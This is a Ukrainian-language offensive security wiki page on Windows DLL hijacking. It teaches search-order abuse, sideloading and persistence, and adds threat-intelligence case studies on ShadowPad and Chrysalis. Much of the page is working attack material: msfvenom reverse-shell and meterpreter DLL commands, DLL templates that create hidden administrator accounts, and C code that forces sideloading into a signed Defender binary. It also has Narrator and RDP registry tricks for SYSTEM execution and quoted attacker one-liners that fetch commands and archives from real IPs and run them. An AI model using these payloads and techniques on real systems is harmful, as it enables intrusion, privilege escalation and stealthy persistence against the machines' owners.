# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Основна інформація

DLL Hijacking полягає в маніпуляції довіреною програмою для завантаження шкідливого DLL. Цей термін охоплює кілька тактик, таких як **DLL Spoofing, Injection, and Side-Loading**. Він головним чином використовується для code execution, досягнення persistence і, рідше, privilege escalation. Незважаючи на те, що тут акцент на escalation, методика hijacking залишається однаковою для різних цілей.

### Поширені техніки

Існує кілька методів для DLL hijacking, кожен з яких ефективний залежно від стратегії завантаження DLL у застосунку:

1. **DLL Replacement**: Замінити справжній DLL шкідливим, за потреби використовуючи DLL Proxying для збереження функціональності оригінального DLL.
2. **DLL Search Order Hijacking**: Розмістити шкідливий DLL у шляху пошуку попереду від легітимного, використовуючи шаблон пошуку застосунку.
3. **Phantom DLL Hijacking**: Створити шкідливий DLL, який застосунок завантажить, вважаючи його відсутнім необхідним DLL.
4. **DLL Redirection**: Змінювати параметри пошуку, такі як %PATH% або файли .exe.manifest / .exe.local, щоб направити застосунок на шкідливий DLL.
5. **WinSxS DLL Replacement**: Замінити легітимний DLL на шкідливий еквівалент у каталозі WinSxS — метод часто пов'язаний з DLL side-loading.
6. **Relative Path DLL Hijacking**: Розмістити шкідливий DLL у директорії під контролем користувача разом із копією застосунку, що нагадує Binary Proxy Execution техніки.

> [!TIP]
> Для поетапного ланцюга, який нашаровує HTML staging, AES-CTR configs і .NET implants поверх DLL sideloading, перегляньте робочий процес нижче.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Пошук відсутніх DLL

Найбільш поширений спосіб знайти відсутні DLL у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) зі Sysinternals, **налаштувавши** **наступні 2 фільтри**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

і просто показати **File System Activity**:

![](<../../../images/image (153).png>)

Якщо ви шукаєте **відсутні DLL загалом**, залиште це працювати кілька **секунд**.\
Якщо ви шукаєте **відсутній DLL у конкретному виконуваному файлі**, слід встановити **інший фільтр, наприклад "Process Name" "contains" `<exec name>`, запустити його та зупинити захоплення подій**.

## Експлуатація відсутніх DLL

Щоб здійснити escalate privileges, найкращий шанс — мати можливість **записати dll, який процес з підвищеними правами спробує завантажити** в одному з місць, де він буде шукатися. Таким чином ми зможемо **записати** dll у **папку**, де цей **dll шукається раніше**, ніж папка з **оригінальним dll** (рідкісний випадок), або ми зможемо **записати у якусь папку, куди dll буде шукатися**, але оригінальний **dll не існує** ні в якій іншій папці.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

**Windows applications** шукають DLL, дотримуючись набору заздалегідь визначених шляхів пошуку, у певній послідовності. Проблема DLL hijacking виникає, коли шкідливий DLL стратегічно розміщується в одній із цих директорій так, що він завантажується раніше за автентичний DLL. Рішенням для запобігання цього є забезпечення використання застосунком абсолютних шляхів при зверненні до необхідних DLL.

Ви можете побачити **DLL search order на 32-bit** системах нижче:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Це **за замовчуванням** порядок пошуку з увімкненим **SafeDllSearchMode**. Коли він вимкнений, поточна директорія піднімається на друге місце. Щоб вимкнути цю функцію, створіть значення реєстру **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть його в 0 (за замовчуванням увімкнено).

Якщо функція [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликається з **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається у директорії виконуваного модуля, яку **LoadLibraryEx** завантажує.

Нарешті, зауважте, що **dll може бути завантажений із зазначенням абсолютного шляху, а не лише імені**. У такому випадку цей dll **буде шукатися тільки в тому шляху** (якщо у dll є залежності, вони будуть шукатися як звичайно — по імені).

Існують інші способи змінити порядок пошуку, але я не буду їх тут пояснювати.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

An advanced way to deterministically influence the DLL search path of a newly created process is to set the DllPath field in RTL_USER_PROCESS_PARAMETERS when creating the process with ntdll’s native APIs. By supplying an attacker-controlled directory here, a target process that resolves an imported DLL by name (no absolute path and not using the safe loading flags) can be forced to load a malicious DLL from that directory.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Приклад практичного використання
- Помістіть шкідливий xmllite.dll (що експортує потрібні функції або проксить до оригінального) у ваш каталог DllPath.
- Запустіть підписаний бінарний файл, відомий тим, що шукає xmllite.dll за іменем, використовуючи наведений вище прийом. Завантажувач резольвить імпорт через вказаний DllPath і sideloads ваш DLL.

Цю техніку спостерігали в диких умовах для організації багатоступеневих sideloading-ланцюгів: початковий launcher скидає допоміжний DLL, який потім породжує підписаний Microsoft бінар, що піддається перехопленню, з кастомним DllPath, щоби примусити завантаження DLL атакуючого з staging directory.


#### Винятки в порядку пошуку dll згідно документації Windows

У документації Windows зазначені певні винятки зі стандартного порядку пошуку DLL:

- Коли зустрічається **DLL, що має те саме ім'я, що й уже завантажений у пам'ять**, система обходить звичайний пошук. Натомість вона виконує перевірку перенаправлення та маніфесту перед тим, як за замовчуванням використати DLL, вже завантажений у пам'ять. **У цьому випадку система не здійснює пошук DLL**.
- У випадках, коли DLL визнається як **known DLL** для поточної версії Windows, система використовуватиме свою версію цього known DLL разом із будь-якими його залежними DLL, **відмовляючись від процесу пошуку**. Ключ реєстру **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список цих known DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL виконується так, ніби вони були вказані лише за **ім'ям модуля**, незалежно від того, чи початковий DLL був ідентифікований повним шляхом.

### Ескалація привілеїв

**Вимоги**:

- Знайдіть процес, який працює або буде працювати під **іншими привілеями** (горизонтальне або латеральне пересування), і який **не має DLL**.
- Переконайтеся, що доступ на **запис** доступний для будь-якого **каталогу**, в якому буде **шукатися DLL**. Це місце може бути каталогом виконуваного файлу або каталогом у системному шляху.

Так, вимоги важко знайти, оскільки **за замовчуванням доволі дивно знайти привілейований виконуваний файл, якому бракує DLL**, і ще **дивніше мати права на запис у папці системного шляху** (за замовчуванням цього не можна). Але в неправильно налаштованих середовищах це можливо.\
Якщо вам пощастить і ви відповідаєте вимогам, ви можете переглянути проект [UACME](https://github.com/hfiref0x/UACME). Навіть якщо **головна мета проєкту — bypass UAC**, ви можете знайти там **PoC** of a Dll hijaking для версії Windows, яке можна використати (ймовірно, просто змінивши шлях до папки, у якій у вас є права на запис).

Зверніть увагу, що ви можете **перевірити свої права доступу в папці**, виконавши:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
І **перевірте дозволи всіх папок у PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ви також можете перевірити імпорти executable та експорти dll за допомогою:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Для повного керівництва про те, як **abuse Dll Hijacking to escalate privileges** маючи дозволи на запис у **System Path folder** див.:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Автоматизовані інструменти

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)перевірить, чи маєте дозволи на запис у будь-яку папку всередині system PATH.\  
Інші цікаві автоматизовані інструменти для виявлення цієї вразливості — **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ та _Write-HijackDll_.

### Приклад

Якщо ви знайдете експлуатований сценарій, однією з найважливіших умов для успішного використання буде **створити dll, який експортує принаймні всі функції, які виконуваний файл імпортує з нього**. Зауважте, що Dll Hijacking корисний для [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) або з[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ви можете знайти приклад **how to create a valid dll** у цьому дослідженні dll hijacking, орієнтованому на виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\  
Більше того, в **наступному розділі** ви знайдете кілька **базових dll кодів**, які можуть бути корисні як **templates** або для створення **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

По суті, **Dll proxy** — це Dll, здатний **execute your malicious code when loaded**, а також **expose** та **work** як очікується, **relaying all the calls to the real library**.

За допомогою інструмента [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) ви фактично можете **indicate an executable and select the library** яку хочете proxify і **generate a proxified dll** або **indicate the Dll** і **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Отримати meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Створити користувача (x86 я не бачив версії для x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Ваш власний

Зверніть увагу, що в деяких випадках DLL, який ви компілюєте, має **export several functions**, які будуть завантажені процесом-жертвою. Якщо цих функцій не існує, **binary won't be able to load** їх і **exploit will fail**.

<details>
<summary>C DLL шаблон (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Приклад C++ DLL зі створенням користувача</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Альтернативна DLL на C із точкою входу потоку</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Приклад: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe все ще звертається при запуску до передбачуваного, залежного від мови локалізаційного DLL, який можна перехопити для виконання довільного коду та забезпечення персистентності.

Ключові факти
- Шлях перевірки (поточні збірки): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Старий шлях (старіші збірки): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Якщо у вказаному шляху OneCore існує записуваний DLL, контрольований зловмисником, він завантажується і `DllMain(DLL_PROCESS_ATTACH)` виконується. Експорти не потрібні.

Виявлення за допомогою Procmon
- Фільтр: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Запустіть Narrator і спостерігайте спробу завантаження вказаного вище шляху.

Мінімальний DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator; your DLL executes as SYSTEM on the secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Дослідження випадку: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Хід атаки

1. Як звичайний користувач, помістіть `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Чекайте, поки заплановане завдання виконається о 9:30 під контекстом поточного користувача.
3. Якщо адміністратор увійшов у систему під час виконання завдання, шкідлива DLL запускається в сесії адміністратора з medium integrity.
4. Застосуйте стандартні UAC bypass techniques, щоб підняти привілеї з medium integrity до SYSTEM privileges.

## Кейс: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Зловмисники часто поєднують MSI-based droppers з DLL side-loading, щоб виконувати payloads під довіреним, підписаним процесом.

Огляд ланцюжка
- User downloads MSI. A CustomAction runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from embedded resources.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Look for entries that run executables or VBScript. Example suspicious pattern: LaunchApplication executing an embedded file in background.
- У Orca (Microsoft Orca.exe) перегляньте CustomAction, InstallExecuteSequence та Binary tables.
- Embedded/split payloads in the MSI CAB:
- Адміністративне витягнення: msiexec /a package.msi /qb TARGETDIR=C:\out
- Або використайте lessmsi: lessmsi x package.msi C:\out
- Шукайте кілька дрібних фрагментів, які конкатенуються та розшифровуються VBScript CustomAction. Загальний потік:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Практичне sideloading з wsc_proxy.exe
- Помістіть ці два файли в ту ж папку:
- wsc_proxy.exe: легітимний підписаний хост (Avast). Процес намагається завантажити wsc.dll за іменем з його каталогу.
- wsc.dll: attacker DLL. Якщо не потрібні специфічні експорти, DllMain є достатнім; інакше зберіть proxy DLL і переспрямуйте необхідні експорти до справжньої бібліотеки, виконуючи payload у DllMain.
- Скомпілюйте мінімальний DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Для вимог експорту використовуйте фреймворк для проксування (e.g., DLLirant/Spartacus) щоб згенерувати forwarding DLL, яка також виконує ваш payload.

- Ця техніка покладається на розв'язання імен DLL бінарником-хостом. Якщо хост використовує абсолютні шляхи або прапори безпечного завантаження (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може зазнати невдачі.
- KnownDLLs, SxS, and forwarded exports можуть впливати на пріоритет і повинні бути враховані при виборі хост-бінарника та набору експортів.

## Підписані триади + зашифровані payloads (ShadowPad case study)

Check Point описали, як Ink Dragon розгортає ShadowPad, використовуючи **three-file triad**, щоб зливатися з легітимним програмним забезпеченням, одночасно зберігаючи основний payload зашифрованим на диску:

1. **Signed host EXE** – постачальників таких як AMD, Realtek або NVIDIA зловживають (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Зловмисники перейменовують виконуваний файл, щоб він виглядав як Windows-бінарник (наприклад `conhost.exe`), але Authenticode signature залишається дійсним.
2. **Malicious loader DLL** – скидається поруч з EXE з очікуваним ім'ям (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL зазвичай є MFC-бінарником, обфускованим за допомогою ScatterBrain framework; його єдиною задачею є знайти зашифрований blob, розшифрувати його та reflectively map ShadowPad.
3. **Encrypted payload blob** – часто зберігається як `<name>.tmp` в тій же директорії. Після memory-mapping розшифрованого payload, loader видаляє TMP файл, щоб знищити судові докази.

Tradecraft notes:

* Перейменування підписаного EXE (залишаючи оригінальне `OriginalFileName` в заголовку PE) дозволяє йому маскуватися під Windows-бінарник, але зберігати підпис постачальника, тому відтворюйте звичку Ink Dragon скидати бінарники, схожі на `conhost.exe`, які насправді є утилітами AMD/NVIDIA.
* Оскільки виконуваний файл залишається довіреним, більшість контролів allowlisting потребують лише, щоб ваш malicious DLL знаходився поруч із ним. Зосередьтеся на кастомізації loader DLL; підписаний батьківський EXE зазвичай може запускатися без змін.
* Дешифратор ShadowPad очікує, що TMP blob знаходиться поруч із loader і є записуваним, щоб він міг занулити файл після відображення. Тримайте директорію записуваною, поки payload не завантажиться; після того, як він буде в пам'яті, TMP-файл можна безпечно видалити для OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Оператори поєднують DLL sideloading з LOLBAS так, щоб єдиним кастомним артефактом на диску була malicious DLL поруч із довіреним EXE:

- **Remote command loader (Finger):** Прихований PowerShell породжує `cmd.exe /c`, тягне команди з Finger сервера і передає їх у `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` отримує текст через TCP/79; `| cmd` виконує відповідь сервера, дозволяючи операторам міняти сервер другої стадії на стороні сервера.

- **Built-in download/extract:** Завантажте архів з нешкідливим розширенням, розпакуйте його та розмістіть sideload-ціль і DLL під випадковою папкою `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` приховує прогрес і слідує редиректам; `tar -xf` використовує вбудований у Windows tar.

- **WMI/CIM launch:** Запустіть EXE через WMI, щоб телеметрія показувала процес, створений CIM, поки він завантажує colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Працює з бінарниками, які віддають перевагу локальним DLL (наприклад, `intelbq.exe`, `nearby_share.exe`); payload (наприклад, Remcos) запускається під довіреним ім'ям.

- **Hunting:** Тригерити на `forfiles`, коли `/p`, `/m` і `/c` з'являються разом; це рідко трапляється поза адмінітрувальними скриптами.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Нещодавнє вторгнення Lotus Blossom зловживало довіреним ланцюжком оновлень, щоб доставити NSIS-упакований dropper, який підготував DLL sideload і повністю в пам'яті payloads.

Хід операції
- `update.exe` (NSIS) створює `%AppData%\Bluetooth`, позначає його як **HIDDEN**, скидає перейменований Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` і зашифрований blob `BluetoothService`, після чого запускає EXE.
- Host EXE імпортує `log.dll` і викликає `LogInit`/`LogWrite`. `LogInit` виконує mmap-load blob; `LogWrite` розшифровує його за допомогою кастомного LCG-стриму (константи **0x19660D** / **0x3C6EF35F**, ключовий матеріал походить від попереднього хешу), перезаписує буфер plaintext shellcode, звільняє тимчасові буфери і переходить до нього.
- Щоб уникнути IAT, loader резолвить API шляхом хешування імен експорту використовуючи **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, потім застосовує Murmur-style avalanche (**0x85EBCA6B**) і порівнює з посоленими цільовими хешами.

Основний shellcode (Chrysalis)
- Розшифровує модуль типу PE шляхом повторення операцій add/XOR/sub з ключем `gQ2JR&9;` протягом п'яти проходів, потім динамічно завантажує `Kernel32.dll` → `GetProcAddress` для завершення резолюції імпортів.
- Відтворює рядки імен DLL під час виконання через операції побітового повороту/ XOR на кожному символі, потім завантажує `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Використовує другий резолвер, який обходить **PEB → InMemoryOrderModuleList**, парсить кожну таблицю експорту у 4-байтних блоках з Murmur-style змішуванням, і лише у випадку ненахождення хешу звертається до `GetProcAddress`.

Вбудована конфігурація & C2
- Конфіг живе всередині скинутого файлу `BluetoothService` на **offset 0x30808** (розмір **0x980**) і RC4-розшифровується ключем `qwhvb^435h&*7`, відкриваючи C2 URL та User-Agent.
- Beacon-и формують крапково-розділений профіль хоста, додають префікс тега `4Q`, потім RC4-шифрують з ключем `vAuig34%^325hGV` перед викликом `HttpSendRequestA` через HTTPS. Відповіді RC4-розшифровуються і маршрутизуються tag switch'ом (`4T` shell, `4V` exec процесу, `4W/4X` запис файлу, `4Y` чит/експфільтрація, `4\\` uninstall, `4` перерахунок дисків/файлів + випадки покрокової передачі).
- Режим виконання контролюється CLI-аргументами: без аргументів = встановлення persistence (service/Run ключ), що вказує на `-i`; `-i` перезапускає себе з `-k`; `-k` пропускає встановлення і запускає payload.

Спостережено альтернативний loader
- Те ж вторгнення скинуло Tiny C Compiler і виконало `svchost.exe -nostdlib -run conf.c` з `C:\ProgramData\USOShared\`, з `libtcc.dll` поруч. Наданий зловмисником C-джерельний код містив embedded shellcode, скомпілювався і виконався в пам'яті без звернення до диска у вигляді PE. Відтворіть за допомогою:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Цей етап компіляції та виконання на основі TCC імпортував `Wininet.dll` під час виконання та завантажував shellcode другої стадії з жорстко вбудованого URL, забезпечуючи гнучкий loader, який маскується під запуск компілятора.

## Посилання

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
